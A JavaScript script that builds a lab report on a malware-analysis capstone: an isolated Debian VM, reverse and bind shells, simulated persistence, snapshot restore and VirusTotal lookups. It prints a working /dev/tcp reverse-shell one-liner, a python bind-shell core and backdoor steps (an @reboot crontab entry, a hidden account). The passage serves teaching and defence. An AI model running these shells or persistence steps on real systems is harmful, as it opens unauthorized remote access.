// Malware Analysis Sandbox Lab — capstone report generator (docx-js)
const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  ImageRun, Header, Footer, PageNumber, NumberFormat, AlignmentType,
  HeadingLevel, WidthType, BorderStyle, ShadingType, TableOfContents,
  TableLayoutType, SectionType, ExternalHyperlink,
} = require("docx");
const fs = require("fs");
const path = require("path");

const LAB = path.resolve(__dirname, "..", "..");
const SHOTS = path.join(LAB, "evidence", "screenshots");

// ── Palette: DM-1 Deep Cyan (tech report) ─────────────────────────────
const P = {
  bg: "162235", accent: "37DCF2",
  cover: { titleColor: "FFFFFF", subtitleColor: "B0B8C0", metaColor: "90989F", footerColor: "687078" },
  table: { headerBg: "1B6B7A", headerText: "FFFFFF", accentLine: "1B6B7A", innerLine: "C8DDE2", surface: "EDF3F5" },
  headings: "0A1628", body: "000000", secondary: "606870",
};

const NB = { style: BorderStyle.NONE, size: 0, color: "FFFFFF" };
const noBorders = { top: NB, bottom: NB, left: NB, right: NB };
const allNoBorders = { top: NB, bottom: NB, left: NB, right: NB, insideHorizontal: NB, insideVertical: NB };

// ── Cover helpers (from design-system.md) ─────────────────────────────
function splitTitleLines(title, charsPerLine) {
  if (title.length <= charsPerLine) return [title];
  const breakAfter = new Set([..."-_/ \t"]);
  const lines = [];
  let remaining = title;
  while (remaining.length > charsPerLine) {
    let breakAt = -1;
    for (let i = charsPerLine; i >= Math.floor(charsPerLine * 0.6); i--) {
      if (i < remaining.length && breakAfter.has(remaining[i - 1])) { breakAt = i; break; }
    }
    if (breakAt === -1) {
      const limit = Math.min(remaining.length, Math.ceil(charsPerLine * 1.3));
      for (let i = charsPerLine + 1; i < limit; i++) {
        if (breakAfter.has(remaining[i - 1])) { breakAt = i; break; }
      }
    }
    if (breakAt === -1) breakAt = charsPerLine;
    lines.push(remaining.slice(0, breakAt).trim());
    remaining = remaining.slice(breakAt).trim();
  }
  if (remaining) lines.push(remaining);
  if (lines.length > 1 && lines[lines.length - 1].length <= 2) {
    const last = lines.pop();
    lines[lines.length - 1] += last;
  }
  return lines;
}

function calcTitleLayout(title, maxWidthTwips, preferredPt = 40, minPt = 24) {
  const charWidth = (pt) => pt * 20; // conservative (CJK width; English is narrower)
  const charsPerLine = (pt) => Math.floor(maxWidthTwips / charWidth(pt));
  let titlePt = preferredPt, lines;
  while (titlePt >= minPt) {
    const cpl = charsPerLine(titlePt);
    if (cpl < 2) { titlePt -= 2; continue; }
    lines = splitTitleLines(title, cpl);
    if (lines.length <= 3) break;
    titlePt -= 2;
  }
  if (!lines || lines.length > 3) {
    lines = splitTitleLines(title, charsPerLine(minPt));
    titlePt = minPt;
  }
  return { titlePt, titleLines: lines };
}

function calcCoverSpacing(params) {
  const { titleLineCount = 1, titlePt = 36, hasSubtitle = false, hasEnglishLabel = false,
    metaLineCount = 0, fixedHeight = 800, pageHeight = 16838, marginTop = 0, marginBottom = 0 } = params;
  const SAFETY = 1200;
  const usableHeight = pageHeight - marginTop - marginBottom - SAFETY;
  const titleHeight = titleLineCount * (titlePt * 23 + 200);
  const subtitleHeight = hasSubtitle ? (12 * 23 + 600) : 0;
  const englishLabelHeight = hasEnglishLabel ? (9 * 23 + 600) : 0;
  const metaHeight = metaLineCount * (10 * 23 + 100);
  const implicitParaHeight = 3 * 300;
  const contentHeight = titleHeight + subtitleHeight + englishLabelHeight + metaHeight + fixedHeight + implicitParaHeight;
  const remainingSpace = usableHeight - contentHeight;
  const safeRemaining = Math.max(remainingSpace, 400);
  const FOOTER_MIN = 800;
  const rawTop = Math.floor(safeRemaining * 0.45);
  const rawBottom = Math.floor(safeRemaining * 0.45);
  const bottomSpacing = Math.max(rawBottom, FOOTER_MIN);
  const topSpacing = Math.max(rawTop - Math.max(0, FOOTER_MIN - rawBottom), 400);
  return { topSpacing, midSpacing: Math.max(safeRemaining - topSpacing - bottomSpacing, 0), bottomSpacing };
}

function buildCoverR1(config) {
  const PC = config.palette;
  const padL = 1200, padR = 800;
  const availableWidth = 11906 - padL - padR - 300;
  const { titlePt, titleLines } = calcTitleLayout(config.title, availableWidth, 36, 24);
  const titleSize = titlePt * 2;
  const spacing = calcCoverSpacing({
    titleLineCount: titleLines.length, titlePt,
    hasSubtitle: !!config.subtitle, hasEnglishLabel: !!config.englishLabel,
    metaLineCount: (config.metaLines || []).length, fixedHeight: 400,
  });
  const accentLeft = { style: BorderStyle.SINGLE, size: 8, color: PC.accent, space: 12 };
  const children = [];
  children.push(new Paragraph({ spacing: { before: spacing.topSpacing } }));
  if (config.englishLabel) {
    children.push(new Paragraph({
      indent: { left: padL, right: padR }, spacing: { after: 500 },
      border: { bottom: { style: BorderStyle.SINGLE, size: 6, color: PC.accent, space: 8 } },
      children: [new TextRun({ text: config.englishLabel.split("").join("  "), size: 18, color: PC.accent, font: { ascii: "Calibri", eastAsia: "SimHei" }, characterSpacing: 40 })],
    }));
  }
  for (let i = 0; i < titleLines.length; i++) {
    children.push(new Paragraph({
      indent: { left: padL },
      spacing: { after: i < titleLines.length - 1 ? 100 : 300, line: Math.ceil(titlePt * 23), lineRule: "atLeast" },
      children: [new TextRun({ text: titleLines[i], size: titleSize, bold: true, color: PC.cover.titleColor, font: { eastAsia: "SimHei", ascii: "Arial" } })],
    }));
  }
  if (config.subtitle) {
    children.push(new Paragraph({
      indent: { left: padL }, spacing: { after: 800 },
      children: [new TextRun({ text: config.subtitle, size: 24, color: PC.cover.subtitleColor, font: { eastAsia: "Microsoft YaHei", ascii: "Arial" } })],
    }));
  }
  for (const line of (config.metaLines || [])) {
    children.push(new Paragraph({
      indent: { left: padL + 200 }, spacing: { after: 80 },
      border: { left: accentLeft },
      children: [new TextRun({ text: line, size: 24, color: PC.cover.metaColor, font: { eastAsia: "Microsoft YaHei", ascii: "Arial" } })],
    }));
  }
  children.push(new Paragraph({ spacing: { before: spacing.bottomSpacing } }));
  children.push(new Paragraph({
    indent: { left: padL, right: padR },
    border: { top: { style: BorderStyle.SINGLE, size: 2, color: PC.accent, space: 8 } },
    spacing: { before: 200 },
    children: [
      new TextRun({ text: config.footerLeft || "", size: 16, color: PC.cover.footerColor, font: { ascii: "Arial" } }),
      new TextRun({ text: "                                        " }),
      new TextRun({ text: config.footerRight || "", size: 16, color: PC.cover.footerColor, font: { ascii: "Arial" } }),
    ],
  }));
  return [new Table({
    width: { size: 100, type: WidthType.PERCENTAGE },
    layout: TableLayoutType.FIXED,
    borders: allNoBorders,
    rows: [new TableRow({
      height: { value: 16838, rule: "exact" },
      children: [new TableCell({
        shading: { type: ShadingType.CLEAR, fill: PC.bg }, borders: noBorders,
        children,
      })],
    })],
  })];
}

// ── Body builders ─────────────────────────────────────────────────────
const EN = { ascii: "Times New Roman", eastAsia: "Times New Roman" };

function h1(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_1, spacing: { before: 360, after: 160, line: 312 },
    children: [new TextRun({ text, bold: true, size: 32, color: P.headings, font: EN })],
  });
}
function h2(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_2, spacing: { before: 260, after: 120, line: 312 },
    children: [new TextRun({ text, bold: true, size: 28, color: P.headings, font: EN })],
  });
}
function body(text, opts = {}) {
  return new Paragraph({
    alignment: AlignmentType.JUSTIFIED, spacing: { line: 312, after: opts.after !== undefined ? opts.after : 120 },
    children: (Array.isArray(text) ? text : [{ t: text }]).map(r =>
      new TextRun({ text: r.t !== undefined ? r.t : r, bold: !!r.b, italics: !!r.i, size: 24, color: P.body, font: EN })),
  });
}
function bullet(text, level = 0) {
  return new Paragraph({
    bullet: { level }, spacing: { line: 312, after: 60 },
    children: [{ t: text }].map(r => new TextRun({ text: r.t !== undefined ? r.t : r, size: 24, color: P.body, font: EN })),
  });
}
function mono(lines, size = 17) {
  return lines.map((line, i) => new Paragraph({
    spacing: { line: 240, lineRule: "atLeast", after: i === lines.length - 1 ? 160 : 0 },
    shading: { type: ShadingType.CLEAR, fill: "F2F6F7" },
    indent: { left: 240, right: 240 },
    children: [new TextRun({ text: line.length ? line : " ", size, color: "1A2B33", font: { ascii: "Consolas", eastAsia: "Consolas" } })],
  }));
}
function caption(text) {
  return new Paragraph({
    alignment: AlignmentType.CENTER, spacing: { before: 80, after: 240, line: 276 },
    children: [new TextRun({ text, size: 20, italics: true, color: P.secondary, font: EN })],
  });
}
function figure(file, num, desc) {
  const img = fs.readFileSync(path.join(SHOTS, file));
  return [
    new Paragraph({
      alignment: AlignmentType.CENTER, keepNext: true, spacing: { before: 160, after: 0 },
      children: [new ImageRun({ data: img, type: "png", transformation: { width: 580, height: 363 } })],
    }),
    caption(`Figure ${num}: ${desc}`),
  ];
}
function cell(text, opts = {}) {
  return new TableCell({
    children: [new Paragraph({
      alignment: opts.align || AlignmentType.LEFT, spacing: { line: 276 },
      children: [new TextRun({ text, bold: !!opts.bold, size: 21, color: opts.color || P.body, font: EN })],
    })],
    shading: opts.fill ? { type: ShadingType.CLEAR, fill: opts.fill } : undefined,
    margins: { top: 60, bottom: 60, left: 120, right: 120 },
    width: opts.w ? { size: opts.w, type: WidthType.PERCENTAGE } : undefined,
  });
}
function table(headers, rows, widths) {
  return new Table({
    width: { size: 100, type: WidthType.PERCENTAGE },
    borders: {
      top: { style: BorderStyle.SINGLE, size: 4, color: P.table.accentLine },
      bottom: { style: BorderStyle.SINGLE, size: 4, color: P.table.accentLine },
      left: NB, right: NB,
      insideHorizontal: { style: BorderStyle.SINGLE, size: 1, color: P.table.innerLine },
      insideVertical: NB,
    },
    rows: [
      new TableRow({
        tableHeader: true, cantSplit: true,
        children: headers.map((t, i) => cell(t, { bold: true, color: P.table.headerText, fill: P.table.headerBg, w: widths ? widths[i] : undefined })),
      }),
      ...rows.map((r, ri) => new TableRow({
        cantSplit: true,
        children: r.map((t, i) => cell(t, { w: widths ? widths[i] : undefined, fill: ri % 2 === 0 ? undefined : P.table.surface })),
      })),
    ],
  });
}
function tableTitle(text) {
  return new Paragraph({
    keepNext: true, spacing: { before: 200, after: 80 },
    children: [new TextRun({ text, bold: true, size: 21, color: P.secondary, font: EN })],
  });
}
function link(label, url) {
  return new ExternalHyperlink({
    children: [new TextRun({ text: label, style: "Hyperlink", size: 24, font: EN })],
    link: url,
  });
}

// ── Content ───────────────────────────────────────────────────────────
const bodyChildren = [];

// 1. Abstract
bodyChildren.push(h1("1. Abstract"));
bodyChildren.push(body([
  { t: "This report documents a capstone laboratory exercise in malware analysis. A Debian 13 (trixie) Linux virtual machine was built and run entirely inside VMware Workstation 26 on the Windows host, attached to a host-only virtual network (VMnet1) so that it had " },
  { t: "no route to the internet by construction", b: true },
  { t: ". A snapshot named 01-CLEAN-BASELINE was taken before any experiment. Two educational payloads were then executed inside the isolated guest: a reverse shell that connected back to the analyst host over TCP/4444, and a bind shell that listened on TCP/4445 and accepted a connection from the host. For each payload, the process tree, socket states, and file-system effects were observed and logged. Simulated attacker persistence (a @reboot crontab entry, a backdoor account, a dropped payload copy and a marker file) was then planted, and the virtual machine was reverted to the clean snapshot. Post-restore verification confirmed that every artifact of the exercise, including the payload scripts themselves, had been removed. A VirusTotal lookup was performed for both payload hashes; no existing report was found for either file, and per the assignment security note nothing was uploaded. The exercise demonstrates why network isolation and snapshot-based recovery are the foundation of safe malware analysis." },
]));

// 2. Objectives
bodyChildren.push(h1("2. Objectives and Scope"));
bodyChildren.push(body("The exercise followed the seven instructions of the assigned capstone topic, using VMware Workstation as the hypervisor:"));
bodyChildren.push(bullet("Create a Linux virtual machine with no internet access (Section 3)."));
bodyChildren.push(bullet("Take a snapshot of the clean virtual machine before the experiment (Section 3.4)."));
bodyChildren.push(bullet("Run a simple reverse shell and a bind shell in the controlled lab (Section 4)."));
bodyChildren.push(bullet("Observe and document processes, network activity and system changes (Section 5)."));
bodyChildren.push(bullet("Identify the scripts and check VirusTotal, recording the outcome either way (Section 7)."));
bodyChildren.push(bullet("Restore the clean snapshot and verify that all changes were reverted (Section 6)."));
bodyChildren.push(bullet("Submit screenshots, payload details, VirusTotal findings and this report (Sections 4-7 and Appendices)."));
bodyChildren.push(body([
  { t: "Scope limits: all activity stayed inside the isolated VM and the host-only link to the analyst host. " },
  { t: "No real credentials were used (the lab account password is fictitious), the payloads were written for this exercise, and no file was uploaded to any online scanning service.", b: true },
]));

// 3. Environment
bodyChildren.push(h1("3. Lab Environment and Isolation Design"));
bodyChildren.push(h2("3.1 Host and Hypervisor"));
bodyChildren.push(body("The lab was hosted on a Windows 11 machine with VMware Workstation 26.0.0 (build 25388281). VMware virtual networks were already initialised: VMnet8 (NAT) and VMnet1 (host-only). Only VMnet1 was used; the VM never had a NAT or bridged adapter."));
bodyChildren.push(tableTitle("Table 1: Lab components"));
bodyChildren.push(table(
  ["Component", "Detail"],
  [
    ["Hypervisor", "VMware Workstation 26.0.0 build-25388281 (Windows 11 host)"],
    ["Guest operating system", "Debian 13.7 'trixie' (amd64), kernel 6.12.107-1"],
    ["Virtual hardware", "2 vCPU, 2048 MB RAM, 12 GB thin-provisioned SCSI disk (705 MB used at baseline)"],
    ["Payload observation tools (host)", "Python 3.12 listener/client scripts; OpenSSH client"],
    ["Guest inspection tools", "openssh-server, python3 3.13, procps (ps), iproute2 (ip, ss)"],
  ],
  [30, 70]
));
bodyChildren.push(...figure("02-clean-boot-console.png", 1, "Clean baseline VM console: hostname, kernel, interfaces and the route table with no default route."));
bodyChildren.push(h2("3.2 Network Isolation"));
bodyChildren.push(body([
  { t: "The VM's single Ethernet adapter was bound to " },
  { t: "VMnet1, a host-only network (192.168.116.0/24)", b: true },
  { t: ". A host-only network has no upstream gateway: the VMnetDHCP scope serves only the host adapter (192.168.116.1) and guest VMs. The guest received a static address 192.168.116.200/24, and its network configuration was deliberately written without a default gateway and with an empty resolv.conf, so the guest cannot even attempt DNS resolution of internet names. Isolation was verified from inside the guest before any payload ran (Table 2, Figure 2)." },
]));
bodyChildren.push(tableTitle("Table 2: Isolation verification tests (guest, 2026-10-26 04:12 UTC)"));
bodyChildren.push(table(
  ["Test", "Command (guest)", "Expected", "Result"],
  [
    ["Route table", "ip route", "No default route", "PASS - only 192.168.116.0/24 link route"],
    ["DNS configuration", "cat /etc/resolv.conf", "Empty file", "PASS - 0 bytes"],
    ["Name resolution", "python3 gethostbyname('example.com')", "Failure", "PASS - 'Temporary failure in name resolution'"],
    ["Internet TCP", "connect(8.8.8.8:443)", "Failure", "PASS - 'Network is unreachable' (errno 101)"],
    ["Host-only link", "ping 192.168.116.1", "Success", "PASS - 0% packet loss"],
    ["Internet ICMP", "ping 8.8.8.8", "Failure", "PASS - 'Network is unreachable'"],
  ],
  [22, 30, 18, 30]
));
bodyChildren.push(...figure("03-isolation-verified.png", 2, "VM console during isolation verification: no default route, empty resolv.conf, DNS and internet access failing, host-only ping succeeding."));
bodyChildren.push(h2("3.3 Guest Provisioning"));
bodyChildren.push(body("The guest was installed unattended: the Debian 13.7.0 netinst ISO (SHA-256 a7ef94ac2fb9a7fec454552abd629b7cc9d5155c886165a45649f5ce6167e355, verified against the official SHA256SUMS) was remastered with a preseed answer file and an auto-boot isolinux entry, so the installer ran hands-off and produced a minimal system with an SSH server reachable only from the analyst host. Remastering used the ISO's own package set, so the installation itself never needed an internet connection."));
bodyChildren.push(h2("3.4 Clean Baseline Snapshot"));
bodyChildren.push(body([
  { t: "Immediately after installation and before any experiment, the VM was powered off cleanly and a snapshot named " },
  { t: "01-CLEAN-BASELINE", b: true },
  { t: " was taken with 'vmrun snapshot'. At this point the guest contained only the base system; the payload scripts had not yet been delivered. This snapshot is the restore point used in Section 6." },
]));

// 4. Procedure
bodyChildren.push(h1("4. Experimental Procedure"));
bodyChildren.push(h2("4.1 Payloads"));
bodyChildren.push(body("Two short, heavily commented shell scripts were authored for this exercise and copied to /root in the guest over SSH. The reverse shell uses bash's /dev/tcp feature to open a TCP connection to the analyst host and attach an interactive /bin/sh to it, retrying every five seconds like real command-and-control (C2) malware. The bind shell uses python3 to listen on TCP/4445 and serves an interactive /bin/sh to whoever connects. Full listings are in Appendix A."));
bodyChildren.push(...mono([
  "# lab_reverse.sh (core line) - guest connects OUT to the analyst host",
  "bash -c \"exec 3<>/dev/tcp/192.168.116.1/4444; exec /bin/sh -i <&3 >&3 2>&3\"",
  "",
  "# lab_bind.sh (core logic) - guest listens, host connects IN",
  "srv.bind((\"0.0.0.0\", 4445)); srv.listen(5)   # python3 socket server",
  "os.dup2(conn.fileno(), 0/1/2); os.execv(\"/bin/sh\", [\"sh\", \"-i\"])",
]));
bodyChildren.push(tableTitle("Table 3: Payload identification"));
bodyChildren.push(table(
  ["File", "Size", "MD5", "SHA-256"],
  [
    ["lab_reverse.sh", "1016 B", "2cdcb5a4dd24b04a8116b8cf62a5b281", "0e206101e93fb971ea6c0b1d8f09ac7c14b128564af0b7858bd5259039e7d302"],
    ["lab_bind.sh", "1557 B", "9db308079f8d8e74ec67c9ebc1b8b071", "4144b221ce867830a2d08a52f235d351778e11ece29b262e3f4d9268f9c711f6"],
  ],
  [18, 10, 28, 44]
));
bodyChildren.push(h2("4.2 Reverse Shell Exercise"));
bodyChildren.push(body("A Python listener was started on the host (192.168.116.1:4444) and the payload was launched in the guest with 'setsid bash /root/lab_reverse.sh &' so that it survived the SSH session. The callback arrived immediately, and the listener drove a fixed, non-interactive command sequence through the shell while logging the whole session."));
bodyChildren.push(...mono([
  "[10:15:43] [LISTENER] waiting for reverse shell on 192.168.116.1:4444",
  "[10:15:45] [CONNECT] reverse shell connected from 192.168.116.200:54102",
  "[10:15:47] [BANNER] \"/bin/sh: 0: can't access tty; job control turned off\"",
  "[10:15:53] [CMD] id        -> uid=0(root) gid=0(root) groups=0(root)",
  "[10:15:59] [CMD] uname -a  -> Linux malware-lab 6.12.107+deb13-amd64 ...",
  "[10:16:23] [CMD] cat /tmp/c2_beacon.txt -> beacon started ...04:17:35 UTC",
  "[10:16:28] [DONE] closing session",
]));
bodyChildren.push(body("When the listener closed the session, the payload reconnected 95 seconds later from a different ephemeral port (34744) - the same reconnect behaviour real C2 implants exhibit. Both C2 sessions are preserved in the evidence log reverse_session.log."));
bodyChildren.push(...figure("04-reverse-shell-active.png", 3, "VM console while the reverse shell is live: payload process, spawned /bin/sh, and the ESTABLISHED connection to 192.168.116.1:4444."));
bodyChildren.push(h2("4.3 Bind Shell Exercise"));
bodyChildren.push(body("The bind payload was launched the same way. From the host, a Python client connected to 192.168.116.200:4445 and ran the same command sequence, logging the session. The guest-side evidence shows the python3 process listening on 0.0.0.0:4445 and, once the host connected, a spawned 'sh' with its standard file descriptors wired to the socket."));
bodyChildren.push(...figure("05-bind-shell-active.png", 4, "VM console while the bind shell serves the host connection on TCP/4445."));
bodyChildren.push(h2("4.4 Simulated Post-Exploitation Changes"));
bodyChildren.push(body("To make the snapshot-restore test meaningful, four changes that a real attacker might make were applied inside the VM (all fictitious and lab-only):"));
bodyChildren.push(bullet("A dropped, hidden copy of the payload: /usr/local/bin/.sysupdate"));
bodyChildren.push(bullet("Cron persistence: root crontab entry '@reboot /usr/local/bin/.sysupdate'"));
bodyChildren.push(bullet("A backdoor account: user svcupdate (uid 1001) with a home directory"));
bodyChildren.push(bullet("A loot/impact marker file: /root/LOOT_MARKER.txt"));
bodyChildren.push(...figure("06-post-compromise-state.png", 5, "VM console showing the simulated persistence: crontab entry, svcupdate account, marker file and dropped payload copy."));

// 5. Observations
bodyChildren.push(h1("5. Observations and Analysis"));
bodyChildren.push(h2("5.1 Process Behaviour"));
bodyChildren.push(body("Both payloads leave a small, recognisable footprint. The reverse shell is two processes: the looping bash script and its child /bin/sh whose stdin/stdout/stderr are the TCP socket. The bind shell is one resident python3 interpreter that forks a /bin/sh per connection. Neither payload hid itself; both appeared immediately in 'ps auxww', exactly as common off-the-shelf shells do."));
bodyChildren.push(tableTitle("Table 4: Observed processes (guest, during the exercise)"));
bodyChildren.push(table(
  ["PID", "Process", "Observation"],
  [
    ["1064", "bash /root/lab_reverse.sh", "Looping payload; wrote beacon file /tmp/c2_beacon.txt at start"],
    ["1067 / 1104", "/bin/sh -i", "Spawned shell; fd 0,1,2 all bound to the C2 socket (see ss output)"],
    ["1170", "python3 -", "Bind shell server; LISTEN 0.0.0.0:4445, forks one shell per connection"],
    ["1190", "sh -i (child of 1170)", "Served the host's bind session on accepted socket"],
  ],
  [12, 28, 60]
));
bodyChildren.push(h2("5.2 Network Behaviour"));
bodyChildren.push(tableTitle("Table 5: Observed sockets (ss -tupn)"));
bodyChildren.push(table(
  ["Direction", "Local (guest)", "Remote", "State", "Meaning"],
  [
    ["Outbound", "192.168.116.200:54102", "192.168.116.1:4444", "ESTABLISHED", "Reverse shell C2 channel (session 1)"],
    ["Outbound", "192.168.116.200:34744", "192.168.116.1:4444", "ESTABLISHED", "Automatic reconnect (session 2)"],
    ["Inbound", "192.168.116.200:4445", "192.168.116.1:61028", "ESTABLISHED", "Bind shell serving the analyst host"],
    ["Listen", "0.0.0.0:4445", "-", "LISTEN", "Bind shell waiting for any client"],
  ],
  [14, 26, 22, 14, 24]
));
bodyChildren.push(body([
  { t: "Two behavioural signatures are worth noting for detection practice: the reverse shell's " },
  { t: "periodic reconnect attempts", b: true },
  { t: " (one SYN attempt every 5 seconds while no listener is present, visible as failed connect noise in logs), and the bind shell's " },
  { t: "listening port on 0.0.0.0", b: true },
  { t: ", which is trivially visible with 'ss -tulpn' and is the classic first indicator taught for bind-shell triage." },
]));
bodyChildren.push(h2("5.3 System Changes"));
bodyChildren.push(tableTitle("Table 6: System changes observed during the exercise"));
bodyChildren.push(table(
  ["Area", "Change observed", "Persistence across reboot"],
  [
    ["Processes", "Payload + spawned shells running", "No (memory only)"],
    ["Network", "New listening port 4445; outbound C2 flows to host:4444", "No (re-established by payload)"],
    ["File system", "/root/lab_reverse.sh, /root/lab_bind.sh, /tmp/c2_beacon.txt, /root/LOOT_MARKER.txt, /usr/local/bin/.sysupdate", "Yes (disk)"],
    ["Accounts", "New user svcupdate (uid 1001)", "Yes (/etc/passwd)"],
    ["Scheduler", "Root crontab with @reboot entry", "Yes (/var/spool/cron/crontabs/root)"],
  ],
  [16, 54, 30]
));

// 6. Restore
bodyChildren.push(h1("6. Snapshot Restore and Verification"));
bodyChildren.push(body("The VM was shut down cleanly with 'systemctl poweroff' and reverted with 'vmrun revertToSnapshot ... 01-CLEAN-BASELINE', then started again. Every change from Sections 4 and 5 was checked from inside the restored guest; all seven checks passed."));
bodyChildren.push(tableTitle("Table 7: Post-restore verification (2026-10-27 06:12 UTC)"));
bodyChildren.push(table(
  ["#", "Check", "Expected", "Result"],
  [
    ["1", "Root crontab", "No crontab", "PASS - 'no crontab for root'"],
    ["2", "Backdoor account svcupdate", "Absent from /etc/passwd", "PASS"],
    ["3", "/root contents", "No LOOT_MARKER.txt; no payload scripts", "PASS - only .bashrc, .profile, .ssh"],
    ["4", "/usr/local/bin/.sysupdate", "Absent", "PASS - directory empty"],
    ["5", "Listening sockets", "sshd (TCP/22) only", "PASS"],
    ["6", "Payload processes", "None", "PASS"],
    ["7", "Network isolation", "Still no default route", "PASS - 192.168.116.0/24 link only"],
  ],
  [6, 30, 32, 32]
));
bodyChildren.push(...figure("07-after-restore-verified.png", 6, "VM console after reverting to 01-CLEAN-BASELINE: every experiment artifact is gone and isolation is intact."));
bodyChildren.push(body([
  { t: "Note that even the payload scripts themselves were gone after the restore, because they had been delivered " },
  { t: "after", i: true },
  { t: " the snapshot was taken. This is the strongest possible demonstration of snapshot semantics: reverting restores the entire disk state, not just selected files." },
]));

// 7. VirusTotal
bodyChildren.push(h1("7. VirusTotal Findings"));
bodyChildren.push(h2("7.1 Lookup Performed"));
bodyChildren.push(body("Both payload scripts were identified by the SHA-256 hashes in Table 3. Lookups were performed on 27 October 2026 in two ways: (a) exact-hash searches of the public web/search index for each hash, and (b) direct requests to the VirusTotal report pages for each hash. Per the assignment security note, the files were NOT uploaded to VirusTotal or any other scanner."));
bodyChildren.push(h2("7.2 Result: No Existing Report"));
bodyChildren.push(body([
  { t: "No VirusTotal report exists for either file.", b: true },
  { t: " The web-index search for each hash returned zero results, and the VirusTotal GUI pages (which are JavaScript applications) returned no report data for the hashes. This is the expected outcome: the scripts were authored locally for this exercise and have never been distributed, so no vendor or community member has ever submitted them. The assignment instruction 'if no report exists, mention that' is therefore satisfied here: first-seen date, detection score and historical indicators are not available for these samples." },
]));
bodyChildren.push(h2("7.3 Industry Context"));
bodyChildren.push(body("For context, reverse/bind shell scripts that DO circulate publicly are typically flagged by name-brand engines under generic families rather than unique names, because detection of plain-text shell one-liners is largely signature-based (matching patterns such as '/dev/tcp' combined with '/bin/sh -i'). Publicly visible examples of Linux script detections on VirusTotal show names of the form Trojan.Generic.*, Trojan[Backdoor]/Linux.* and Trojan:Linux/Mirai.* families (for example, a documented sample at virustotal.com/gui/file/11242cdb5dac9309a2f330bd0dad96efba9ccc9b9d46f2361e8bf8e4cde543c1). Research systems such as TXHunter (triagingx.com) specifically target reverse-shell activity as a behavioural class. If the lab payloads in this report were ever uploaded, the most likely outcome would be generic suspicious-script detections or no detection at all - a useful reminder that a clean scan does not mean a file is benign."));

// 8. Discussion
bodyChildren.push(h1("8. Why Sandboxing and Snapshot-Based Recovery Matter"));
bodyChildren.push(body("This exercise illustrates five principles that generalise directly to real malware analysis work:"));
bodyChildren.push(bullet("Containment precedes detonation. The payload was only ever allowed to reach the analyst's own host over a host-only network with no internet path. Had the VM used NAT or bridged networking, a reverse shell would have been a live incident, not a lab."));
bodyChildren.push(bullet("Snapshots convert a destructive experiment into a repeatable one. Because every change was captured in Table 6 and then discarded by a single revert, the lab can be re-run indefinitely from a provably clean state - and 'provably' matters: Table 7 is the evidence, not an assumption."));
bodyChildren.push(bullet("Disk persistence is invisible to memory-only inspection. The crontab entry, the backdoor account and the dropped file survived a full VM restart; only processes and sockets vanished. Any analysis that stops at 'ps' and 'ss' underestimates the footprint of even a toy implant."));
bodyChildren.push(bullet("Baseline-first discipline enables diffing. Knowing exactly what the clean VM looked like (one listening service, one account, empty crontab) is what made the post-exploitation diff in Table 6 unambiguous."));
bodyChildren.push(bullet("Observability was built into the lab, not improvised. Static IP, key-only SSH, a logged listener and console screenshots made every claim in this report reproducible from the evidence files in Appendix B."));

// 9. Lessons learned
bodyChildren.push(h1("9. Lessons Learned and Operational Notes"));
bodyChildren.push(bullet("Background processes launched over SSH die with the session unless detached with setsid/nohup; the first launch attempt failed silently for this reason and was retried with 'setsid ... &' plus an in-session check."));
bodyChildren.push(bullet("'pkill -f lab_reverse.sh' matches the invoking command line itself and kills the operator's own shell; the classic 'lab_[r]everse' bracket pattern avoids self-matching."));
bodyChildren.push(bullet("VirusTotal's web GUI is a JavaScript application; automated lookups without an API key cannot read report data, and lookups by exact hash of an unpublished file legitimately return nothing."));
bodyChildren.push(bullet("Console screenshots were captured from the guest's framebuffer (/dev/fb0, vmwgfxdrmfb, 1280x800) rendered over SSH - a dependency-free way to obtain authentic VM-console images from a headless guest."));
bodyChildren.push(bullet("The host-only DHCP server on VMnet1 assigns from 192.168.116.128-254; the guest used a static preseeded address (.200) so that every stage of the lab could address it deterministically."));

// 10. Conclusions
bodyChildren.push(h1("10. Conclusions"));
bodyChildren.push(body("All seven assignment instructions were completed with recorded evidence: an isolated Linux VM was created and its lack of internet access was demonstrated; a clean snapshot was taken before the experiment; reverse and bind shells were executed and their processes, sockets and system effects documented; VirusTotal was queried and the absence of any report for the locally authored scripts was recorded without uploading anything; and the VM was reverted to 01-CLEAN-BASELINE with a seven-point verification proving that the environment was returned to its pre-experiment state. The exercise met its educational goal: it shows concretely what a reverse shell and a bind shell look like on a live system, and it shows concretely why analysts refuse to work without isolation and snapshots."));

// Appendix A
bodyChildren.push(h1("Appendix A: Payload Listings"));
bodyChildren.push(h2("A.1 lab_reverse.sh (SHA-256 0e2061...)"));
bodyChildren.push(...mono(fs.readFileSync(path.join(LAB, "payloads", "lab_reverse.sh"), "utf8").split(/\r?\n/)));
bodyChildren.push(h2("A.2 lab_bind.sh (SHA-256 4144b2...)"));
bodyChildren.push(...mono(fs.readFileSync(path.join(LAB, "payloads", "lab_bind.sh"), "utf8").split(/\r?\n/)));

// Appendix B
bodyChildren.push(h1("Appendix B: Evidence Inventory"));
bodyChildren.push(tableTitle("Table B-1: Submitted evidence files (malware-sandbox-lab folder)"));
bodyChildren.push(table(
  ["File", "Contents"],
  [
    ["evidence/screenshots/02-clean-boot-console.png", "Clean guest console: system, interfaces, routes at baseline"],
    ["evidence/screenshots/03-isolation-verified.png", "Isolation verification tests on the VM console (Figure 2)"],
    ["evidence/screenshots/04-reverse-shell-active.png", "Reverse shell session live on the console (Figure 3)"],
    ["evidence/screenshots/05-bind-shell-active.png", "Bind shell session live on the console (Figure 4)"],
    ["evidence/screenshots/06-post-compromise-state.png", "Simulated persistence artifacts (Figure 5)"],
    ["evidence/screenshots/07-after-restore-verified.png", "Post-restore verification checks (Figure 6)"],
    ["evidence/hashes.txt", "MD5 and SHA-256 of both payloads"],
    ["evidence/isolation_check.log", "Full isolation test transcript"],
    ["evidence/reverse_session.log", "Both reverse-shell C2 sessions, logged by the host listener"],
    ["evidence/reverse-shell-during.log", "In-guest ps/ss output captured during a live C2 session"],
    ["evidence/bind_session.log", "Bind shell session log from the host client"],
    ["evidence/bind-shell-launch.log", "Bind shell launch and listening-socket evidence"],
    ["evidence/post-compromise-changes.log", "Persistence artifacts as applied"],
    ["evidence/restore_verification.log", "Seven-point post-restore verification transcript"],
    ["evidence/snapshot_ops.log", "vmrun snapshot/list/revert command transcript"],
    ["payloads/lab_reverse.sh, payloads/lab_bind.sh", "The two payload scripts (Appendix A)"],
    ["build/preseed.cfg", "Unattended-install answer file used to provision the VM"],
